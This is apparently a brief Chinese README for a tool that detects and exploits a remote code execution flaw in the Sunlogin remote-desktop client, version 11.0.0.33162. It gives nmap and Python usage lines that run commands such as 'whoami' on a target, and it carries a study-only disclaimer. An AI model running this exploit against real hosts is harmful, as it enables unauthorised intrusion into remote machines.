# Sunlogin_RCE
*日葵RCE简单探测和利用脚本

仅供学习使用，切勿用于非法测试

测试版本：SunloginClient_11.0.0.33162_X64

## Usage

```
nmap --script sunlogin_rce <target>
```

```
python3 sunlogin_rce.py -u 10.0.0.1 -p 49194 -c whoami
```